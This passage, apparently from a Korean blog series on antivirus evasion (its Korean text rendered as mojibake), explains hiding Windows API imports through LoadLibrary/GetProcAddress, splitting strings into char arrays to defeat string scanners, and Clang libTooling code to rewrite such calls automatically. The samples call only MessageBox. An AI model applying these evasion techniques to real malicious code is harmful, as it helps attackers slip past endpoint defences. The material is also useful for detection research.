ëŒ€í•´ì„œ ë‹¤ë£° ê²ƒì´ë‹¤.</p><h2 id="API-importsì˜-ë¬¸ì œì "><a href="#API-importsì˜-ë¬¸ì œì " class="headerlink" title="API importsì˜ ë¬¸ì œì "></a>API importsì˜ ë¬¸ì œì </h2><p>ê°„ë‹¨í•œ C í”„ë¡œê·¸ë¨ì„ ì•„ë˜ì™€ ê°™ì´ ì‘ì„±í•˜ê³  ë¹Œë“œí•˜ì</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;     MessageBox(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>ê·¸ë¦¬ê³  ê°€ì¥ ì¢‹ì•„í•˜ëŠ” ì»´íŒŒì¼ëŸ¬ë¡œ ë¹Œë“œí•´ë¼. MinGWëŠ” <em>macOS</em>ì—ì„œ <em>Windows</em>ë¡œ í¬ë¡œìŠ¤ ë¹Œë“œë¥¼ í•˜ëŠ” ë° ì‚¬ìš©ëœë‹¤.</p><pre><code class="hljs bash">x86_64-w64-mingw32-gcc test.c -o /tmp/toto.exe</code></pre><p>ê·¸ í›„ì— rabin2(radare2ì— í¬í•¨ë˜ì–´ ìˆìŒ) ë˜ëŠ” GNU strings ìœ í‹¸ë¦¬í‹°ë¥¼ ì‚¬ìš©í•˜ì—¬ ë¬¸ìì—´ì„ ë¦¬ìŠ¤íŠ¸ í•  ìˆ˜ ìˆë‹¤.</p><pre><code class="hljs bash">rabin2 -zz /tmp/toto.exe | bat</code></pre><pre><code class="hljs bash"> 205   â”‚ 201  0x00003c92 0x00408692 7   8    .idata        ascii   strncmp 206   â”‚ 202  0x00003c9c 0x0040869c 8   9    .idata        ascii   vfprintf 207   â”‚ 203  0x00003ca8 0x004086a8 11  12   .idata        ascii   MessageBoxA 208   â”‚ 204  0x00003d10 0x00408710 12  13   .idata        ascii   KERNEL32.dll 209   â”‚ 205  0x00003d84 0x00408784 10  11   .idata        ascii   msvcrt.dll 210   â”‚ 206  0x00003d94 0x00408794 10  11   .idata        ascii   USER32.dll...9557   â”‚ 9553 0x0004f481 0x00458e81 30  31                 ascii   .refptr.__native_startup_state9558   â”‚ 9554 0x0004f4a0 0x00458ea0 11  12                 ascii   __ImageBase9559   â”‚ 9555 0x0004f4ac 0x00458eac 11  12                 ascii   MessageBoxA9560   â”‚ 9556 0x0004f4b8 0x00458eb8 12  13                 ascii   GetLastError9561   â”‚ 9557 0x0004f4c5 0x00458ec5 17  18                 ascii   __imp_MessageBoxA9562   â”‚ 9558 0x0004f4d7 0x00458ed7 23  24                 ascii   GetSystemTimeAsFileTime9563   â”‚ 9559 0x0004f4ef 0x00458eef 22  23                 ascii   mingw_initltssuo_force9564   â”‚ 9560 0x0004f506 0x00458f06 19  20                 ascii   __rt_psrelocs_start</code></pre><p>ì´ í•¨ìˆ˜ë¥¼ <code>User32.dll</code> ë¼ì´ë¸ŒëŸ¬ë¦¬ì—ì„œ ê°€ì ¸ì™€ì•¼ í•˜ë¯€ë¡œ MessageBoxA ë¬¸ìì—´ì€ 3ë²ˆ ë‚˜íƒ€ë‚œë‹¤.(ë’¤ì—ì„œ ìì„¸íˆ ì„¤ëª…)</p><p>MessageBoxA ë¬¸ìì—´ì€ ì•ˆí‹°ë°”ì´ëŸ¬ìŠ¤ì—ì„œ ê°ì§€ë˜ì§€ ì•Šì§€ë§Œ ë‹¤ìŒ APIë“¤ì€ ê°ì§€ë  ê²ƒì´ë‹¤.</p><ul><li>InternetReadFile</li><li>ShellExecute</li><li>CreateRemoteThread</li><li>OpenProcess</li><li>ReadProcessMemory</li><li>WriteProcessMemory</li><li>â€¦</li></ul><h2 id="API-imports-ìˆ¨ê¸°ê¸°"><a href="#API-imports-ìˆ¨ê¸°ê¸°" class="headerlink" title="API imports ìˆ¨ê¸°ê¸°"></a>API imports ìˆ¨ê¸°ê¸°</h2><p>ìœˆë„ìš° ì‹œìŠ¤í…œì—ì„œ ê°œë°œìë“¤ì´ ì™¸ë¶€ ë¼ì´ë¸ŒëŸ¬ë¦¬ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ë° ì‚¬ìš©í•  ìˆ˜ ìˆëŠ” ë°©ë²•ë“¤ì€ ë‹¤ìŒê³¼ ê°™ë‹¤.</p><ul><li>Load-time dynamic linking</li><li>Run-time dynamic linking</li></ul><h3 id="Load-time-dynamic-linking"><a href="#Load-time-dynamic-linking" class="headerlink" title="Load-time dynamic linking"></a>Load-time dynamic linking</h3><p>ì™¸ë¶€ ë¼ì´ë¸ŒëŸ¬ë¦¬ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” ê¸°ë³¸ì ì¸ ë°©ë²•ì´ë©° ë§ì»¤ì— ì˜í•´ ìë™ì ìœ¼ë¡œ ì²˜ë¦¬ëœë‹¤. ë¹Œë“œ ì‚¬ì´í´ ë™ì•ˆ ì• í”Œë¦¬ì¼€ì´ì…˜ì€ ê° ë™ì  ë§í¬ ë¼ì´ë¸ŒëŸ¬ë¦¬(DLL)ì˜ import library(.lib)ì— ì—°ê²°ëœë‹¤. ê°€ì ¸ì˜¨ ê° í•¨ìˆ˜ì— ëŒ€í•´ ë§ì»¤ëŠ” DLLì— ëŒ€í•œ ë‚´ìš©ì„ IATì— ì—”íŠ¸ë¦¬ë¥¼ ì‘ì„±í•œë‹¤.</p><p>ì• í”Œë¦¬ì¼€ì´ì…˜ì´ ì‹œì‘ë  ë•Œ, ìš´ì˜ì²´ì œëŠ” IATë¥¼ íƒìƒ‰í•˜ì—¬ í”„ë¡œì„¸ìŠ¤ì˜ ì£¼ì†Œ ê³µê°„ì— ìˆëŠ” ëª¨ë“  ë¼ì´ë¸ŒëŸ¬ë¦¬ ë¦¬ìŠ¤íŠ¸ë¥¼ ë§¤í•‘í•˜ê³  ê°€ì ¸ì˜¨ ê° í•¨ìˆ˜ì˜ ì£¼ì†ŒëŠ” DLLì˜ Export Address Tableì— í•´ë‹¹ ì—”íŠ¸ë¦¬ë¥¼ ê°€ë¦¬í‚¤ë„ë¡ ì—…ë°ì´íŠ¸ëœë‹¤.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/0.png"></p><p>Import Address Table (IAT)</p><h3 id="Run-time-dynamic-linking"><a href="#Run-time-dynamic-linking" class="headerlink" title="Run-time dynamic linking"></a>Run-time dynamic linking</h3><p>ë‹¤ë¥¸ ë°©ë²•ì€ LoadLibraryë¡œ í•´ë‹¹ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ë¡œë“œí•œ í›„ GetProcAddressë¡œ í•¨ìˆ˜ì˜ ì£¼ì†Œë¥¼ ì–»ì–´ ìˆ˜ë™ì ìœ¼ë¡œ ìˆ˜í–‰í•˜ëŠ” ê²ƒì´ë‹¤. ì˜ˆë¥¼ ë“¤ì–´ ìœ„ì˜ ì˜ˆì‹œë¥¼ run-time dynamic linkingì„ ì ìš©í•  ìˆ˜ ìˆë‹¤.</p><p>ë¨¼ì € MessageBoxA APIì˜ í•¨ìˆ˜ í¬ì¸í„°ë¥¼ ì •ì˜í•´ì•¼ í•œë‹¤. ì‹œì‘í•˜ê¸° ì „ì— Cì˜ í•¨ìˆ˜ í¬ì¸í„° êµ¬ë¬¸ì— ëŒ€í•´ ê°„ë‹¨í•˜ê²Œ ì„¤ëª…í•œë‹¤.</p><pre><code class="hljs cpp">&lt;<span class="hljs-keyword">return</span> type&gt; (*&lt;your pointer name&gt;)(arg1, arg2, ...);</code></pre><p>ë³¼ ìˆ˜ ìˆë“¯ì´ star operator(í•¨ìˆ˜ í¬ì¸í„°ì´ë¯€ë¡œ)ì™€  ê´„í˜¸ë¥¼ ì œì™¸í•˜ë©´ í•¨ìˆ˜ë¥¼ ì •ì˜í•˜ëŠ” êµ¬ë¬¸ê³¼ ê°™ë‹¤.</p><p>ì´ì œ MessageBoxì˜ í”„ë¡œí† íƒ€ì…ì´ í•„ìš”í•œë° Windows SDKì˜ <code>winuser.h</code> í˜¹ì€ <a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-messagebox">MSDN</a>ì—ì„œ ì°¾ì„ ìˆ˜ ìˆë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">MessageBox</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  HWND    hWnd,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpText,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpCaption,</span></span><span class="hljs-function"><span class="hljs-params">  UINT    uType</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p>ì•ì„œ ë§í•œ í•¨ìˆ˜ í¬ì¸í„° êµ¬ë¬¸ì€ ì •í™•í•œ ì •ë³´ë¡œ ì—…ë°ì´íŠ¸í•  ìˆ˜ ìˆë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-keyword">int</span> (*_MessageBoxA)(    HWND hWnd,    LPCTSTR lpText,    LPCTSTR lpCaption,    UINT uType);</code></pre><p>MSDNì€ ì´ í•¨ìˆ˜ê°€ <code>User32.dll</code>ì—ì„œ ë‚´ë³´ë‚´ì§„ ë‹¤ê³  ì„¤ëª…í•œë‹¤.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/1.png"></p><p>MessageBoxA APIëŠ” <code>User32.dll</code>ì—ì„œ ë‚´ë³´ë‚´ ì§„ë‹¤. ë”°ë¼ì„œ ì• í”Œë¦¬ì¼€ì´ì…˜ì€ ì´ ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ ë¨¼ì € ë¡œë“œí•´ì•¼ í•œë‹¤.</p><pre><code class="hljs cpp">HANDLE hUser32 = LoadLibrary(<span class="hljs-string">&quot;User32.dll&quot;</span>);</code></pre><p>ê·¸ í›„ <code>GetProcAddress</code>ë¥¼ ì‚¬ìš©í•˜ì—¬ ìœ„ì—ì„œ ì •ì˜í•œ í•¨ìˆ˜ í¬ì¸í„°ì— ì •í™•í•œ ì£¼ì†Œë¥¼ í• ë‹¹í•  ìˆ˜ ìˆë‹¤.</p><pre><code class="hljs cpp">_MessageBoxA fMessageBoxA = (_MessageBoxA) GetProcAddress(hUser32, <span class="hljs-string">&quot;MessageBoxA&quot;</span>);</code></pre><p>ì—¬ê¸°ì„œ ì›ë˜ ì˜ˆë¥¼ <code>MessageBoxA</code> ëŒ€ì‹  <code>fMessageBoxA</code>ë¥¼ í˜¸ì¶œí•˜ë„ë¡ ìˆ˜ì •í•´ì•¼ í•˜ë©° ë‹¤ìŒê³¼ ê°™ë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*_MessageBoxA)</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  HWND    hWnd,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpText,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpCaption,</span></span><span class="hljs-function"><span class="hljs-params">  UINT    uType</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;    HANDLE hUser32 = LoadLibraryA(<span class="hljs-string">&quot;User32.dll&quot;</span>);    _MessageBoxA fMessageBoxA = (_MessageBoxA) GetProcAddress(hUser32, <span class="hljs-string">&quot;MessageBoxA&quot;</span>);    fMessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p><code>HWND, LCTSTR, UINT</code> ë°ì´í„° íƒ€ì…ì„ ìœ„í•´ <code>Windows.h</code> includeê°€ í•„ìš”í•˜ë‹¤. ì´ ê°„ë‹¨í•œ ì˜ˆì œë¥¼ ë¹Œë“œí•˜ê³  ì‹¤í–‰í•˜ë©´ ì˜ˆìƒëŒ€ë¡œ alert boxê°€ ì‹¤í–‰ëœë‹¤.</p><p><img src="/2020/12/13/idioth/av_evasion_part2/2.png"></p><p>run-time dynamic linkingì„ í•˜ê¸° ìœ„í•´ <code>LoadLibrary</code>ì™€ <code>GetProcAddress</code>ì„ ì‚¬ìš©í•˜ëŠ” ê°„ë‹¨í•œ ì˜ˆì‹œ</p><h3 id="ìµœì¢…-ì ìš©"><a href="#ìµœì¢…-ì ìš©" class="headerlink" title="ìµœì¢… ì ìš©"></a>ìµœì¢… ì ìš©</h3><p><code>strings toto.exe</code>ë¥¼ ì‹¤í–‰í•˜ë©´ ì•„ì§ <code>User32.dll</code>ê³¼ <code>MessageBoxA</code> ë¬¸ìì—´ì´ ë‚˜íƒ€ë‚œë‹¤. ì´ ë¬¸ìì—´ë“¤ì€ ì•”í˜¸í™”ë˜ì–´ì•¼ í•˜ì§€ë§Œ ì´ì „ ê¸€ì—ì„œ ë³´ì—¬ì¤€ ê°„ë‹¨í•œ ë‚œë…í™” íŠ¸ë¦­ìœ¼ë¡œ ì•ˆí‹°ë°”ì´ëŸ¬ìŠ¤ íƒì§€ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆë‹¤. ìµœì¢… ê²°ê³¼ëŠ” ë‹¤ìŒê³¼ ê°™ë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">int</span> <span class="hljs-params">(*_MessageBoxA)</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  HWND    hWnd,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpText,</span></span><span class="hljs-function"><span class="hljs-params">  LPCTSTR lpCaption,</span></span><span class="hljs-function"><span class="hljs-params">  UINT    uType</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>** argv)</span> </span>&#123;    <span class="hljs-keyword">char</span> user32[] = &#123;<span class="hljs-string">&#x27;U&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;d&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-string">&#x27;l&#x27;</span>,<span class="hljs-number">0</span>&#125;;    HANDLE hUser32 = LoadLibraryA(user32);    <span class="hljs-keyword">char</span> messabox[] = &#123;<span class="hljs-string">&#x27;M&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-string">&#x27;g&#x27;</span>,<span class="hljs-string">&#x27;e&#x27;</span>,<span class="hljs-string">&#x27;B&#x27;</span>,<span class="hljs-string">&#x27;o&#x27;</span>,<span class="hljs-string">&#x27;x&#x27;</span>,<span class="hljs-string">&#x27;A&#x27;</span>,<span class="hljs-number">0</span>&#125;;    _MessageBoxA fMessageBoxA = (_MessageBoxA) GetProcAddress(hUser32, messabox);    fMessageBoxA(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre><p>ì´ë²ˆì—ëŠ” <code>strings</code>ì™€ <code>rabin2</code> ë‘˜ ë‹¤ ë¬¸ìì—´ì„ ì°¾ì„ ìˆ˜ ì—†ë‹¤.</p><pre><code class="hljs cpp">âœ  x86_64-w64-mingw32-gcc test.c -o /tmp/toto.exeâœ  strings /tmp/toto.exe | grep MessageBoxâœ  rabin2 -zz /tmp/toto.exe | grep MessageBoxâœ</code></pre><h2 id="ìë™í™”ëœ-ì†ŒìŠ¤-ì½”ë“œ-ë¦¬íŒ©í„°ë§"><a href="#ìë™í™”ëœ-ì†ŒìŠ¤-ì½”ë“œ-ë¦¬íŒ©í„°ë§" class="headerlink" title="ìë™í™”ëœ ì†ŒìŠ¤ ì½”ë“œ ë¦¬íŒ©í„°ë§"></a>ìë™í™”ëœ ì†ŒìŠ¤ ì½”ë“œ ë¦¬íŒ©í„°ë§</h2><p>ì´ì „ ê¸€ì— ì„¤ëª…ëœ ê²ƒê³¼ ê°™ì€ ë°©ë²•ìœ¼ë¡œ ê¸°ì¡´ ì½”ë“œ ë² ì´ìŠ¤ë¥¼ refactoring í•˜ì—¬ ì˜ì‹¬ìŠ¤ëŸ¬ìš´ APIë¥¼ ëŸ°íƒ€ì„ì— ë¡œë“œí•˜ê³  Import Address Tableì—ì„œ ì œê±°í•  ìˆ˜ ìˆë‹¤. <code>libTooling</code>ìœ¼ë¡œ êµ¬í˜„ëœ ê¸°ì¡´ì˜ ì‘ì—…ì„ ê¸°ë°˜ìœ¼ë¡œ í•  ê²ƒì´ë‹¤.</p><p>ì´ ì‘ì—…ì„ ë‹¤ìŒê³¼ ê°™ì´ ë‚˜ì—´í•´ë³´ì.</p><ul><li>ì´ì „ ì˜ˆì œì˜ ì¶”ìƒ êµ¬ë¬¸ íŠ¸ë¦¬ë¥¼ ìƒì„±í•´ë¼. í•¨ìˆ˜ í˜¸ì¶œì„ ìˆ˜ì •í•˜ê¸° ìœ„í•´ ë…¸ë“œë¥¼ ì¡°ì‘í•˜ëŠ” ë°©ë²•ì„ ì´í•´í•˜ëŠ”ë° í•„ìš”í•˜ë‹¤.</li><li><a href="https://clang.llvm.org/docs/LibASTMatchersReference.html">ASTMatcher</a>ë¥¼ ì‚¬ìš©í•˜ì—¬ ì§€ì •ëœ APIì— ëŒ€í•œ API ì½”ë“œ ë² ì´ìŠ¤ì˜ ëª¨ë“  í•¨ìˆ˜ í˜¸ì¶œì„ ì°¾ì•„ë¼.</li><li>ë‹¤ë¥¸ í•¨ìˆ˜ ì‹ë³„ìë¡œ ëª¨ë“  í˜¸ì¶œì„ ëŒ€ì²´í•´ë¼.</li><li>ê° í•¨ìˆ˜ í˜¸ì¶œ ì „ì— <code>LoadLibrary/GetProcAddress</code> í˜¸ì¶œì„ ì‚½ì…í•˜ë¼.</li><li>ì‘ë™í•˜ëŠ”ì§€ í™•ì¸í•´ë¼.</li><li>ëª¨ë“  ì˜ì‹¬ìŠ¤ëŸ¬ìš´ APIë¥¼ ì¢…í•©í•˜ê³  ë‚œë…í™”í•´ë¼.</li></ul><h3 id="MessageBox-ì• í”Œë¦¬ì¼€ì´ì…˜ì˜-ì¶”ìƒ-êµ¬ë¬¸-íŠ¸ë¦¬"><a href="#MessageBox-ì• í”Œë¦¬ì¼€ì´ì…˜ì˜-ì¶”ìƒ-êµ¬ë¬¸-íŠ¸ë¦¬" class="headerlink" title="MessageBox ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì¶”ìƒ êµ¬ë¬¸ íŠ¸ë¦¬"></a>MessageBox ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ ì¶”ìƒ êµ¬ë¬¸ íŠ¸ë¦¬</h3><p>ì›ë³¸ MessageBox ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ Clang ì¶”ìƒ êµ¬ë¬¸ íŠ¸ë¦¬ë¥¼ ë³´ê¸° ìœ„í•´ ë‹¹ì‹ ì˜ Windows SDK ê²½ë¡œë¥¼ ì ìš©í•˜ì—¬ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‚¬ìš©í•˜ì</p><pre><code class="hljs cpp">WIN_INCLUDE=<span class="hljs-string">&quot;/Users/vladimir/dev/avcleaner&quot;</span>CLANG_PATH=<span class="hljs-string">&quot;/usr/local/Cellar/llvm/9.0.1&quot;</span>clang -cc1 -ast-dump <span class="hljs-string">&quot;$1&quot;</span> -D <span class="hljs-string">&quot;_WIN64&quot;</span> -D <span class="hljs-string">&quot;_UNICODE&quot;</span> -D <span class="hljs-string">&quot;UNICODE&quot;</span> -D <span class="hljs-string">&quot;_WINSOCK_DEPRECATED_NO_WARNINGS&quot;</span>\  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$CLANG_PATH/include&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$CLANG_PATH&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/msvc-14.15.26726-include&quot;</span>\  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/ucrt&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/shared&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/um&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/winrt&quot;</span> \  <span class="hljs-string">&quot;-fdeprecated-macro&quot;</span> \  <span class="hljs-string">&quot;-w&quot;</span> \  <span class="hljs-string">&quot;-fdebug-compilation-dir&quot;</span>\  <span class="hljs-string">&quot;-fno-use-cxa-atexit&quot;</span> <span class="hljs-string">&quot;-fms-extensions&quot;</span> <span class="hljs-string">&quot;-fms-compatibility&quot;</span> \  <span class="hljs-string">&quot;-fms-compatibility-version=19.15.26726&quot;</span> <span class="hljs-string">&quot;-std=c++14&quot;</span> <span class="hljs-string">&quot;-fdelayed-template-parsing&quot;</span> <span class="hljs-string">&quot;-fobjc-runtime=gcc&quot;</span> <span class="hljs-string">&quot;-fcxx-exceptions&quot;</span> <span class="hljs-string">&quot;-fexceptions&quot;</span> <span class="hljs-string">&quot;-fseh-exceptions&quot;</span> <span class="hljs-string">&quot;-fdiagnostics-show-option&quot;</span> <span class="hljs-string">&quot;-fcolor-diagnostics&quot;</span> <span class="hljs-string">&quot;-x&quot;</span> <span class="hljs-string">&quot;c++&quot;</span></code></pre><pre><code class="hljs bash">bash clang-astdump.sh <span class="hljs-built_in">test</span>/messagebox_simple.c &gt; <span class="hljs-built_in">test</span>/messagebox_simple.c.ast</code></pre><p><img src="/2020/12/13/idioth/av_evasion_part2/3.png"></p><p>MessageBoxA APIë¥¼ í˜¸ì¶œí•˜ëŠ” ê°„ë‹¨í•œ ì• í”Œë¦¬ì¼€ì´ì…˜ì˜ Clang ì¶”ìƒ êµ¬ë¬¸ íŠ¸ë¦¬</p><p>CallExpr ìœ í˜•ì˜ AST ë…¸ë“œë¥¼ ì°¾ìœ¼ë©´ ì†ŒìŠ¤ ì½”ë“œì—ì„œì˜ í•¨ìˆ˜ í˜¸ì¶œì„ ì°¾ì„ ìˆ˜ ìˆë‹¤. ìœ„ ì‚¬ì§„ì— ë‚˜ì™€ìˆëŠ” ê²ƒì²˜ëŸ¼ ì‹¤ì œ í˜¸ì¶œë˜ëŠ” í•¨ìˆ˜ ì´ë¦„ì€ í•˜ìœ„ ë…¸ë“œ ì¤‘ í•˜ë‚˜ì— ì§€ì •ë˜ì–´ ìˆìœ¼ë¯€ë¡œ ë‚˜ì¤‘ì— ì ‘ê·¼í•  ìˆ˜ ìˆì–´ì•¼ í•œë‹¤.</p><h3 id="íŠ¹ì •-APIì˜-í•¨ìˆ˜-í˜¸ì¶œ-ì°¾ê¸°"><a href="#íŠ¹ì •-APIì˜-í•¨ìˆ˜-í˜¸ì¶œ-ì°¾ê¸°" class="headerlink" title="íŠ¹ì • APIì˜ í•¨ìˆ˜ í˜¸ì¶œ ì°¾ê¸°"></a>íŠ¹ì • APIì˜ í•¨ìˆ˜ í˜¸ì¶œ ì°¾ê¸°</h3><p><a href="https://clang.llvm.org/docs/LibASTMatchersReference.html">ASTMatcher</a>ëŠ” íŠ¹ì • í•¨ìˆ˜ì— ëŒ€í•œ ëª¨ë“  í•¨ìˆ˜ í˜¸ì¶œì„ ì—´ê±°í•˜ëŠ”ë° í•„ìš”í•˜ë‹¤. ìš°ì„  ì´ì „ ê¸€ì—ì„œ ì‚¬ìš©ëœ ê²ƒë³´ë‹¤ ë” ë³µì¡í•˜ë¯€ë¡œ ì´ matcherì— ë§ëŠ” êµ¬ë¬¸ì„ ì–»ëŠ” ê²ƒì´ ì¤‘ìš”í•˜ë‹¤. ì í•©í•œ ê²ƒì„ ì°¾ê¸° ìœ„í•´ì„œ ì†ŒìŠ¤ ì½”ë“œì—ì„œ custom queryë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” interactive toolì¸ <code>clang-query</code>ë¥¼ ì‚¬ìš©í–ˆë‹¤. í¥ë¯¸ë¡­ê²Œë„ ì´ê²ƒì€ libTooling ê¸°ë°˜ì´ê³  ì´ ê¸€ì—ì„œ ë³´ì—¬ì¤€ ì–´ë–¤ ê²ƒë³´ë‹¤ í›¨ì”¬ ê°•ë ¥í•˜ë‹¤.</p><pre><code class="hljs bash">clang-query&gt; match callExpr(callee(functionDecl(hasName(<span class="hljs-string">&quot;MessageBoxA&quot;</span>))))Match <span class="hljs-comment">#1:</span>/Users/vladimir/dev/scrt/avcleaner/<span class="hljs-built_in">test</span>/messagebox_simple.c:6:5: note: <span class="hljs-string">&quot;root&quot;</span> binds here    MessageBoxA(NULL, <span class="hljs-string">&quot;Test&quot;</span>, <span class="hljs-string">&quot;Something&quot;</span>, MB_OK);    ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~1 match.clang-query&gt;</code></pre><p>ì‹œí–‰ì°©ì˜¤ì™€ ëª…ë ¹ ì¤„ ì™„ì„±(tab completion)ìœ¼ë¡œ ë¹ ë¥´ê²Œ ì‘ì—… ì†”ë£¨ì…˜ì— ì ‘ê·¼í•  ìˆ˜ ìˆì—ˆë‹¤. matcherê°€ ì˜ ë™ì‘í•˜ëŠ” ê²ƒì„ í™•ì¸í–ˆìœ¼ë‹ˆ ì´ì „ ê¸€ì—ì„œ ìˆ˜í–‰í•œ ê²ƒê³¼ ê°™ì€ ìƒˆë¡œìš´ <a href="https://clang.llvm.org/doxygen/classclang_1_1ASTConsumer.html">ASTConsumer</a>ë¥¼ ìƒì„±í•  ìˆ˜ ìˆë‹¤. <code>clang-query</code>ë¥¼ ì‚¬ìš©í•˜ì—¬ ìˆ˜í–‰í•œ ê²ƒì„ C++ ì¬í˜„í•˜ëŠ” ê²ƒì´ë‹¤.</p><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ApiCallConsumer</span> :</span> <span class="hljs-keyword">public</span> clang::ASTConsumer &#123;<span class="hljs-keyword">public</span>:    ApiCallConsumer(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> ApiName, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> TypeDef, <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> Library)            : _ApiName(<span class="hljs-built_in">std</span>::move(ApiName)), _TypeDef(<span class="hljs-built_in">std</span>::move(TypeDef)), _Library(<span class="hljs-built_in">std</span>::move(Library)) &#123;&#125;    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">HandleTranslationUnit</span><span class="hljs-params">(clang::ASTContext &amp;Context)</span> <span class="hljs-keyword">override</span> </span>&#123;                <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> clang::ast_matchers;        <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> AVObfuscator;        llvm::outs() &lt;&lt; <span class="hljs-string">&quot;[ApiCallObfuscation] Registering ASTMatcher for &quot;</span> &lt;&lt; _ApiName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;        MatchFinder Finder;        <span class="hljs-function">ApiMatchHandler <span class="hljs-title">Handler</span><span class="hljs-params">(&amp;ASTRewriter, _ApiName, _TypeDef, _Library)</span></span>;        <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> Matcher = callExpr(callee(functionDecl(hasName(_ApiName)))).bind(<span class="hljs-string">&quot;callExpr&quot;</span>);        Finder.addMatcher(Matcher, &amp;Handler);        Finder.matchAST(Context);    &#125;<span class="hljs-keyword">private</span>:    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> _ApiName;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> _TypeDef;    <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> _Library;&#125;;</code></pre><p>ì¤‘ìš”í•œ êµ¬í˜„ ì„¸ë¶€ ì‚¬í•­ì€ ë§ì€ ë‹¤ë¥¸ í•¨ìˆ˜ë“¤ì— ì ìš©í•  ìˆ˜ ìˆëŠ” ê°€ëŠ¥ì„±ì„ ì 